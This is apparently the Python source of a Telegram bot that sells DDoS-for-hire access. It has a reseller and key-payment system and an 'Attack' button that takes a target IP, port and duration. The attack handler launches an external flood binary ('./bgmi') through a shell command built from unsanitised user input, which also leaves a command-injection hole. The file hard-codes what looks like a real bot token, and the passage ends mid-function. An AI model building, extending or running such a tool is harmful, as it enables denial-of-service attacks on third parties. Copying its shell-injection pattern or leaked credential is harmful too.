import os
import json
import time
import random
import string
import telebot
import datetime
import calendar
import subprocess
import threading
import asyncio
import logging
from threading import Thread
from telebot import types
from dateutil.relativedelta import relativedelta
import subprocess


# Insert your Telegram bot token here
bot = telebot.TeleBot('7622141135:AAEIEQnR46fqzKRbrMb0seWJoQoHUS7T02U')

# Admin user IDs
admin_id = {"6864281179", "1456998674"}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"
BOT_LINK = "@Ishsbbebs_bot"
escaped_bot_link = BOT_LINK.replace('_', '\\_')

# Per key cost for resellers
KEY_COST = {"1hour": 30, "5hours": 80, "1day": 120, "7days": 600, "1month": 1500}

# In-memory storage
users = {}
keys = {}
last_attack_time = {}

# Path to the voice file (must be in the same directory as this script)
VOICE_FILE_PATH = 'voice.mp3'

# List of blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001, 10000, 10001, 10002]

# Read users and keys from files initially
def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}


def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def create_random_key(length=15):
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    custom_key = f"VIP-ME-{random_key}"
    return custom_key

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now()
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time
            
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"")
        
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"| ➖ 𝗨𝘀𝗲𝗿𝗡𝗮𝗺𝗲 : {user_id}\n | ➖ 𝗧𝗶𝗺𝗲 : {datetime.datetime.now()}\n"
    if target:
        log_entry += f" | ➖ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗣 : {target}\n"
    if port:
        log_entry += f" | ➖ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗣𝗢𝗥𝗧 : {port}\n"
    if time:
        log_entry += f" | ➖ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 : {time}\n\n"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "No data found."
            else:
                file.truncate(0)
                return "➖ Logs cleared ✅"
    except FileNotFoundError:
        return "No data found."
        
# Load resellers and their balances from the JSON file
def load_resellers():
    try:
        with open(RESELLERS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except json.JSONDecodeError:
        return {}

# Save resellers and their balances to the JSON file
def save_resellers(resellers):
    with open(RESELLERS_FILE, "w") as file:
        json.dump(resellers, file, indent=4)

# Initialize resellers data
resellers = load_resellers()

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return

    command_parts = message.text.split(' ', 1)
    if len(command_parts) < 2:
        bot.reply_to(message, "Usage: /broadcast <message>", parse_mode='Markdown')
        return

    broadcast_msg = command_parts[1]
    all_users = set(users.keys()) | set(resellers.keys()) | set(admin_id)  # Combine all user IDs

    sent_count = 0
    for user in all_users:
        try:
            bot.send_message(user, f"📢 *𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 :*\n\n*{broadcast_msg}*", parse_mode='Markdown')
            sent_count += 1
        except Exception as e:
            print(f"{e}")

    bot.reply_to(message, f"➖ *𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 {sent_count} 𝘂𝘀𝗲𝗿𝘀* ! ✅", parse_mode='Markdown')


# Admin command to add a reseller
@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return

    # Command syntax: /addreseller <user_id> <initial_balance>
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "➖ 𝗨𝘀𝗮𝗴𝗲: /𝗮𝗱𝗱𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 <𝘂𝘀𝗲𝗿_𝗶𝗱> <𝗯𝗮𝗹𝗮𝗻𝗰𝗲>")
        return

    reseller_id = command[1]
    try:
        initial_balance = int(command[2])
    except ValueError:
        bot.reply_to(message, "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 𝗮𝗺𝗼𝘂𝗻𝘁❗️", parse_mode='Markdown')
        return

    # Add reseller to the resellers.json
    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_resellers(resellers)
        bot.reply_to(message, f"➖ *𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗮𝗱𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆* ✅\n\n*𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗨𝘀𝗲𝗿 𝗜𝗗* : {reseller_id}\n*𝗕𝗮𝗹𝗮𝗻𝗰𝗲* : {initial_balance} *𝗥𝘀*\n\n⚡ *𝗣𝗢𝗪𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧 :* ⚡\n\n➖*𝗖𝗛𝗘𝗖𝗞 𝗬𝗢𝗨𝗥 𝗕𝗔𝗟𝗔𝗡𝗖𝗘*   :   `/balance` \n➖*𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗡𝗘𝗪 𝗞𝗘𝗬*   :   `/genkey`", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"➖ *𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id} 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗘𝘅𝗶𝘀𝘁 *", parse_mode='Markdown')

# Reseller command to check balance
@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)

    if user_id in resellers:
        current_balance = resellers[user_id]
        response = f"💰 *𝗬𝗼𝘂𝗿 𝗰𝘂𝗿𝗿𝗲𝗻𝘁 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 𝗶𝘀* : {current_balance} 𝗥𝘀 "
    else:
        response = "⛔️ *𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 : 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱*"

    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return

    try:
        help_text = """
⚡ *𝗣𝗢𝗪𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧:* ⚡
🏦 `/addreseller <user_id> <balance>` - *Empower a new reseller!* 🔥
🔑 `/genkey <duration>` - *Craft a VIP key of destiny!* 🛠️
📜 `/logs` - *Unveil recent logs & secret records!* 📂
👥 `/users` - *Summon the roster of authorized warriors!* ⚔️
❌ `/remove <user_id>` - *Banish a user to the void!* 🚷
🏅 `/resellers` - *Inspect the elite reseller ranks!* 🎖️
💰 `/addbalance <reseller_id> <amount>` - *Bestow wealth upon a reseller!* 💎
🗑️ `/removereseller <reseller_id>` - *Erase a reseller’s existence!* ⚰️
♻️ `/history` - *Check the Key Generation History!*
""" 
        bot.reply_to(message, help_text, parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"{str(e)}", parse_mode='Markdown')


@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def redeem_key_prompt(message):
    bot.reply_to(message, "*𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆 :*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    key = message.text.strip()

    if key in keys:
        # Check if the user already has VIP access
        if user_id in users:
            current_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() < current_expiration:
                bot.reply_to(message, f"❕𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 *𝗮𝗰𝗰𝗲𝘀𝘀*❕", parse_mode='Markdown')
                return
            else:
                del users[user_id]  # Remove expired access
                save_users()

        # Set the expiration time based on the key's duration
        duration = keys[key]["duration"]
        if duration == "1hour":
            expiration_time = add_time_to_current_date(hours=1)
        elif duration == "5hours":
            expiration_time = add_time_to_current_date(hours=5)
        elif duration == "1day":
            expiration_time = add_time_to_current_date(days=1)    
        elif duration == "7days":
            expiration_time = add_time_to_current_date(days=7)
        elif duration == "1month":
            expiration_time = add_time_to_current_date(months=1)  # Adding 1 month
        else:
            bot.reply_to(message, "Invalid duration in key.")
            return

        # Add user to the authorized list
        users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()

        # Remove the used key
        del keys[key]
        save_keys()

        bot.reply_to(message, f"➖ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 !\n\n𝗲𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻: {users[user_id]}")
    else:
        bot.reply_to(message, "📛 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗼𝗿 𝗲𝘅𝗽𝗶𝗿𝗲𝗱 𝗸𝗲𝘆 📛")

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found"
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️"
        bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_command(message):
    """Start command to display the main menu and send a voice message."""
    # Create the keyboard markup
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")
    redeem_button = types.KeyboardButton("🎟️ Redeem Key")
    markup.add(attack_button, myinfo_button, redeem_button)

    # Send the welcome message with the keyboard
    bot.reply_to(
        message,
        "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 *MEXDEVELOPER 𝗗𝗶𝗟𝗗𝗢𝗦™* 𝗯𝗼𝘁 !",
        reply_markup=markup,
        parse_mode='Markdown'
    )
    
    bot.send_message(
        message.chat.id,
        f"*➖𝗣𝗹𝗲𝗮𝘀𝗲 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻 𝗳𝗿𝗼𝗺 𝗯𝗲𝗹𝗼𝘄 👀* ",
        parse_mode='Markdown'
    )

    # Path to the voice file (ensure this file exists in the same directory)
    voice_file_path = 'voice.mp3'

    # Check if the voice file exists
    if not os.path.exists(voice_file_path):
        bot.reply_to(message, "")
        return

    # Send the voice message
    with open(voice_file_path, 'rb') as voice_file:
        sent_message = bot.send_voice(message.chat.id, voice_file)

    # Wait for 10 seconds (adjust based on your requirements)
    time.sleep(10)

    # Delete the sent voice message
    bot.delete_message(message.chat.id, sent_message.message_id)

COOLDOWN_PERIOD = 1  # 2 minutes

@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)

    # Check if user has VIP access
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')

        # Check if the user's VIP access has expired
        if datetime.datetime.now() > expiration_date:
            response = "❗️𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱. 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻 𝘁𝗼 𝗿𝗲𝗻𝗲𝘄❗️"
            bot.reply_to(message, response)
            return

        # Check if cooldown period has passed
        if user_id in last_attack_time:
            time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
            if time_since_last_attack < COOLDOWN_PERIOD:
                remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
                response = f"⌛️ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁 𝘄𝗮𝗶𝘁 {int(remaining_cooldown)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
                bot.reply_to(message, response)
                return  # Prevent the attack from proceeding

        # Prompt the user for attack details
        response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
        bot.reply_to(message, response)
        bot.register_next_step_handler(message, process_attack_details)

    else:
        response = "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\n*Oops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!*"
        bot.reply_to(message, response)

def process_attack_details(message):
    user_id = str(message.chat.id)
    details = message.text.split()

    if len(details) == 3:
        target = details[0]
        try:
            port = int(details[1])
            time = int(details[2])
            if time > 600:
                response = "❗️𝗘𝗿𝗿𝗼𝗿 : 𝘂𝘀𝗲 𝗹𝗲𝘀𝘀 𝘁𝗵𝗲𝗻 600  𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️"
            else:
                # Record and log the attack
                record_command_logs(user_id, 'attack', target, port, time)
                log_command(user_id, target, port, time)
                full_command = f"./bgmi {target} {port} {time} 1800"
                username = message.chat.username or "No username"
                # Send immediate response that the attack is being executed
                response = f"𝗛𝗲𝗹𝗹𝗼 @{username},  𝗬𝗼𝘂𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗼𝗻  {target} : {port} 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗶𝗻 {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 . \n\n‼️ 𝗣𝗲𝗮𝗰𝗲𝗳𝘂𝗹𝗹𝘆 𝘄𝗮𝗶𝘁 𝗶𝗻 𝗣𝗟𝗔𝗡𝗘  / 𝗟𝗢𝗕𝗕𝗬 𝘄𝗶𝘁𝗵𝗼𝘂𝘁 𝘁𝗼𝘂𝗰𝗵𝗶𝗻𝗴 𝗮𝗻𝘆 𝗕𝘂𝘁𝘁𝗼𝗻 ‼"

                # Run attack asynchronously (this won't block the bot)
                subprocess.Popen(full_command, shell=True)
                
                # After attack time finishes, notify user
                threading.Timer(time, send_attack_finished_message, [message.chat.id, target, port, time]).start()

                # Update the last attack time for the user
                last_attack_time[user_id] = datetime.datetime.now()

        except ValueError:
            response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗼𝗿 𝘁𝗶𝗺𝗲 𝗳𝗼𝗿𝗺𝗮𝘁."
    else:
        response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁"
        
    bot.reply_to(message, response)

def send_attack_finished_message(chat_id, target, port, time):
    """Notify the user that the attack is finished."""
    message = f"➖ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱 ! ✅"
    bot.send_message(chat_id, message) 

@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"

    # Determine the user's role and additional information
    if user_id in admin_id:
        role = "Admin"
        key_expiration = " ➖ "
        balance = "Not Applicable"  # Admins don’t have balances
    elif user_id in resellers:
        role = "Reseller"
        balance = resellers.get(user_id, 0)
        key_expiration = " ➖ " 
    elif user_id in users:
        role = "User"
        key_expiration = users[user_id]  # Fetch expiration directly
        balance = "Not Applicable"  # Regular users don’t have balances
    else:
        role = "Guest"
        key_expiration = "No active key"
        balance = "Not Applicable"
    
    escaped_username = username.replace('_', '\\_').replace('*', '\\*').replace('[', '\\[').replace(']', '\\]')
    escaped_key_expiration = key_expiration.replace('_', '\\_').replace('*', '\\*').replace('[', '\\[').replace(']', '\\]')

    response = (
    f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
    f"ℹ️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : @{escaped_username}\n"
    f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗 : {user_id}\n"
    f"🚹 𝗥𝗼𝗹𝗲 : {role}\n"
    f"🕘 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻 : {escaped_key_expiration}\n"
    )   
    # Add balance info for resellers
    if role == "Reseller":
        response += f"💰 *𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗕𝗔𝗟𝗔𝗡𝗖𝗘* : {balance} 𝗥𝘀\n"

    bot.reply_to(message, response, parse_mode='Markdown')
    
@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    user_id = str(message.chat.id)

    # Ensure only admins can use this command
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return

    if users:
        response = "➖ 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗨𝘀𝗲𝗿𝘀 ✅\n\n"
        for user, expiration in users.items():
            expiration_date = datetime.datetime.strptime(expiration, '%Y-%m-%d %H:%M:%S')
            formatted_expiration = expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            response += f" *𝗨𝘀𝗲𝗿 𝗜𝗗 *: {user}\n *𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗢𝗻* : {formatted_expiration}\n\n"
    else:
        response = "➖ 𝗡𝗼 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱."

    bot.reply_to(message, response, parse_mode='Markdown')
    
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)

    # Ensure only admins can use this command
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return

    # Extract the target User ID from the command
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃𝗲 <𝗨𝘀𝗲𝗿_𝗜𝗗>")
        return

    target_user_id = command[1]

    if target_user_id in users:
        # Remove the user and save changes
        del users[target_user_id]
        save_users()
        response = f"➖ *𝗨𝘀𝗲𝗿 {target_user_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗿𝗲𝗺𝗼𝘃𝗲𝗱*"
    else:
        response = f"➖ *𝗨𝘀𝗲𝗿 {target_user_id} 𝗶𝘀 𝗻𝗼𝘁 𝗶𝗻 𝘁𝗵𝗲 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗹𝗶𝘀𝘁*"

    bot.reply_to(message, response, parse_mode='Markdown')
    
@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    # Check if the user is an admin before displaying resellers' information
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return

    # Construct a message showing all resellers and their balances
    resellers_info = "➖ 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀 ✅\n\n"
    if resellers:
        for reseller_id, balance in resellers.items():
            try:
                # Attempt to get the reseller's username
                reseller_chat = bot.get_chat(reseller_id)
                reseller_username = f"@{reseller_chat.username}" if reseller_chat.username else "Unknown"
            except Exception as e:
                # Handle cases where the chat cannot be found
                logging.error(f"Error fetching chat for reseller {reseller_id}: {e}")
                reseller_username = "Unknown (Chat not found)"

            # Add reseller details to the message
            resellers_info += (
                f"➖  *𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲* : {reseller_username}\n"
                f"➖  *𝗨𝘀𝗲𝗿𝗜𝗗* : {reseller_id}\n"
                f"➖  *𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗕𝗔𝗟𝗔𝗡𝗖𝗘* : {balance} Rs\n\n"
            )
    else:
        resellers_info += " ➖ *𝗡𝗼 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲*"

    # Send the resellers' information to the admin
    bot.reply_to(message, resellers_info, parse_mode='Markdown')

       
@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            command_parts = message.text.split()
            if len(command_parts) != 3:
                bot.reply_to(message, "*➖ 𝗨𝘀𝗮𝗴𝗲: /𝗮𝗱𝗱𝗯𝗮𝗹𝗮𝗻𝗰𝗲 <𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿_𝗶𝗱> <𝗮𝗺𝗼𝘂𝗻𝘁>*", parse_mode='Markdown')
                return
            
            reseller_id = command_parts[1]
            amount = float(command_parts[2])
            
            if reseller_id not in resellers:
                bot.reply_to(message, "Reseller ID not found.")
                return
            
            resellers[reseller_id] += amount
            save_resellers(resellers)
            bot.reply_to(
                message,
                f"➖ *𝗕𝗮𝗹𝗮𝗻𝗰𝗲 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗔𝗱𝗱𝗲𝗱 !\n\n𝗢𝗹𝗱 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 : {resellers[reseller_id] - amount} 𝗥𝘀\n𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿'𝘀 𝗨𝘀𝗲𝗿𝗜𝗗 : {reseller_id}\n𝗨𝗽𝗱𝗮𝘁𝗲𝗱 𝗡𝗲𝘄 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 : {resellers[reseller_id]} 𝗥𝘀\n\n➖𝗞𝗜𝗡𝗗𝗟𝗬 𝗖𝗛𝗘𝗖𝗞 𝗬𝗢𝗨𝗥 𝗨𝗣𝗗𝗔𝗧𝗘𝗗 𝗕𝗔𝗟𝗔𝗡𝗖𝗘* : `/balance`",
                parse_mode='Markdown'
            )
        except ValueError:
            bot.reply_to(message, "Invalid amount.")
    else:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')


@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.chat.id)

    # Syntax: /genkey <duration>
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(
            message,
            "➖ 𝗨𝘀𝗮𝗴𝗲: /𝗴𝗲𝗻𝗸𝗲𝘆 <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻> \n\n⚙️ 𝘼𝙑𝘼𝙄𝙇𝘼𝘽𝙇𝙀 𝙆𝙀𝙔 '𝙨 & 𝘾𝙊𝙎𝙏 : \n     ➖ 𝟭𝗵𝗼𝘂𝗿 : 𝟯𝟬 𝗥𝘀    { `/genkey 1hour` }\n     ➖ 𝟱𝗵𝗼𝘂𝗿𝘀 : 𝟴𝟬 𝗥𝘀    { `/genkey 5hours` }\n     ➖ 𝟭𝗱𝗮𝘆 : 𝟭𝟱𝟬 𝗥𝘀    { `/genkey 1day` }\n     ➖ 𝟳𝗱𝗮𝘆𝘀 : 𝟲𝟬𝟬 𝗥𝘀    { `/genkey 7days` }\n     ➖ 𝟭𝗺𝗼𝗻𝘁𝗵 : 𝟭𝟱𝟬𝟬 𝗥𝘀   { `/genkey 1month` } \n\n                  ‼️  𝗧𝗔𝗣 𝗧𝗢 𝗖𝗢𝗣𝗬  ‼️",
            parse_mode='Markdown'
        )
        return

    duration = command[1].lower()
    if duration not in KEY_COST:
        bot.reply_to(message, "*❌ Invalid duration specified*", parse_mode='Markdown')
        return

    cost = KEY_COST[duration]

    if user_id in admin_id:
        key = create_random_key()  # Generate the key using the renamed function
        keys[key] = {"duration": duration, "expiration_time": None}
        save_keys()

        # Log the generated key to history
        with open("key_history.txt", "a") as history_file:
            username = message.chat.username or f"UserID: {user_id}"
            history_file.write(f"➖ 𝗞𝗘𝗬 : {key}\n➖ 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗 𝗕𝗬 𝗢𝗪𝗡𝗘𝗥 : @{username}\n➖ 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡 𝗢𝗙 𝗞𝗘𝗬 : {duration}\n\n")

        response = (
            f"➖ *𝗞𝗘𝗬 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆* ✅\n\n"
            f"*𝗞𝗘𝗬* : `{key}`\n"
            f"*𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻* : {duration}\n\n"
            f"*𝗕𝗼𝘁 𝗟𝗶𝗻𝗸* : {escaped_bot_link}"
        )
    elif user_id in resellers:
        current_balance = resellers.get(user_id, 0)  # Safely get reseller balance
        if current_balance >= cost:
            resellers[user_id] -= cost
            save_resellers(resellers)

            key = create_random_key()  # Generate the key using the renamed function
            keys[key] = {"duration": duration, "expiration_time": None}
            save_keys()

            # Log the generated key to history
            with open("key_history.txt", "a") as history_file:
                username = message.chat.username or f"UserID: {user_id}"
                history_file.write(f"➖ 𝗞𝗘𝗬 : {key}\n➖ 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗 𝗕𝗬 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 : @{username}\n➖ 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡 𝗢𝗙 𝗞𝗘𝗬 : {duration}\n\n")

            response = (
